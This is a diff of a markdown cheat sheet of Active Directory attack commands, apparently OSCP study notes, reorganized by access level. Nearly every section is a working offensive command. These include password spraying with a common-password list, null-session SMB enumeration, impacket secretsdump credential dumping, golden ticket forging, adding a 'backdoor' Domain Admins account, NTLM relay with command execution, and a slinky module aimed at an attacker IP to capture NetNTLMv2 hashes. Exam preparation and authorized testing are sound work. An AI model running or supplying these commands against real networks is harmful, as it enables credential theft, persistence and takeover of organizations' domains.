@@ -1,32 +1,9 @@
-## Discover domain name
-```bash
-nslookup $IP
-```
+# No Credentials
+## Enumerate [[389,636 LDAP(S)]] for domain users, computers, groups, and computers
 
-## Discover NetBIOS name
+## SMB null session access
 ```bash
-nbtscan $IP
-```
-
-## LDAP extract users
-```bash
-ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=*)" | head -20
-ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | sort > users.txt
-```
-
-## LDAP extract computers
-```bash
-ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=computer)" dNSHostName | grep dNSHostName | cut -d: -f2 | sort > computers.txt
-```
-
-## LDAP extract groups
-```bash
-ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=group)" cn | grep "cn:" | cut -d: -f2
-```
-
-## SMB null session shares
-```bash
-netexec smb $IP -u '' -p '' --shares
+netexec smb $IP -u '' -p '' 
 ```
 
 ## enum4linux-ng null session
@@ -39,64 +16,29 @@ enum4linux-ng -A $IP
 rpcclient -U "" -N $IP
 ```
 
-## Create password list
+##  [[88 Kerberos#AS-REP Roasting|AS-REP Roasting]] 
+
+
+# With Credentials
+
+## Enumerate SMB
 ```bash
-cat > passwords.txt << 'EOF'
-Password123!
-Welcome123!
-Summer2024!
-Spring2024!
-CompanyName2024!
-EOF
+netexec smb $IP -u user -p password
 ```
 
-## Password spray
-```bash
-netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
-```
+### Useful options
+- Check all available protocols: https://www.netexec.wiki/getting-started/using-credentials
+- `--shares` lists SMB shares
+- `-M spider_plus` lists SMB share contents recursively
+- `-X '...'` executes commands using local admin access (useful if WinRM and RDP aren't available)
+- `-M gpp_password`
+- `-M slinky -o NAME=evil SHARE=DocumentsShare SERVER=192.168.45.212`, use with `responder` to capture NetNTLMv2 hashes
+- `-M powershell_history` (requires local admin)
 
-## Test credentials across domain
-```bash
-netexec smb $IP -u serviceaccount -p crackedpassword --shares
-```
 
-## Dump domain credentials
-```bash
-impacket-secretsdump domain.local/username:password@$IP
-```
+## [[88 Kerberos#Kerberoasting|Kerberoasting]]
 
-## Dump SAM and SYSTEM locally
-```
-impacket-secretsdump -sam SAM -system -SYSTEM LOCAL
-```
-
-## Create golden ticket
-```bash
-impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain domain.local -domain-sid S-1-5-21-1234567890-1234567890-1234567890 administrator
-```
-
-## Create domain admin account
-```cmd
-net user backdoor Password123! /add /domain
-net group "Domain Admins" backdoor /add /domain
-```
-
-## Check SMB relay targets
-```bash
-netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
-```
-
-## Run Responder
-```bash
-responder -I eth0 -wrf
-```
-
-## Setup ntlmrelayx
-```bash
-impacket-ntlmrelayx -tf targets.txt -smb2support
-impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
-```
-
+# Lateral Movement Enumeration from Domain-Joined Host
 ## PowerView (Kali Source)
 ```
 /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
@@ -144,25 +86,58 @@ Get-DomainGPO
 Get-DomainGPO | Select-Object displayname,gpcfilesyspath
 ```
 
-
 ## SharpHound (Kali Source)
 ```
 /usr/share/sharphound/SharpHound.exe
 ```
 
-## Run SharpHound
+## Run SharpHound on domain-joined host
 ```cmd
 .\SharpHound.exe -c All -d domain.local --zipfilename bloodhound.zip
 ```
+Collect bloodhound data, then transfer to Kali and ingest and analyze with `bloodhound`, after setup.
 
-## Get password policy
-```bash
-netexec smb $IP -u username -p password --pass-pol
+# Lateral Movement Enumeration Remotely from Kali
+
+## [[389,636 LDAP(S)#Run ldapdomaindump|Run ldapdomaindump]]
+
+## NetExec Check All Hosts
+```
+netexec smb hosts.txt -u user -p password
 ```
 
-## Run ldapdomaindump
+# With Domain Admin
+## Dump domain credentials
 ```bash
-ldapdomaindump -u 'domain.local\username' -p password $IP
+impacket-secretsdump domain.local/username:password@$IP
+```
+
+## Dump SAM and SYSTEM locally
+```
+impacket-secretsdump -sam SAM -system -SYSTEM LOCAL
+```
+
+## Create golden ticket
+```bash
+impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain domain.local -domain-sid S-1-5-21-1234567890-1234567890-1234567890 administrator
+```
+
+## Create domain admin account
+```cmd
+net user backdoor Password123! /add /domain
+net group "Domain Admins" backdoor /add /domain
+```
+
+## Run Responder
+```bash
+responder -I eth0 -A
+```
+Analyze mode prevents spoofing and poisoning, which are prohibited on OSCP.
+
+## Setup ntlmrelayx
+```bash
+impacket-ntlmrelayx -tf targets.txt -smb2support
+impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
 ```
 
 ## Check MS17-010 EternalBlue
